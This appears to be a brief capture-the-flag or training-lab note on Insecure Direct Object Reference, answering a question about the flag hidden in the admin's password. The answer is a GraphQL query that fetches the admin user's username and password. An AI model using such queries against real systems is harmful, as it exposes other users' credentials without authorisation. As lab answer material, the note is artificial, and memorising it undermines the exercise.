# [Insecure Direct Object Reference (IDOR)](Insecure%20Direct%20Object%20Reference%20(IDOR).md)
### After following the steps in the section, what is the flag you can find in the admins password?

```graphql
{ user(username: "admin") { username password } }
```
![](Screenshot%202026-09-14%20at%2013.59.59.png)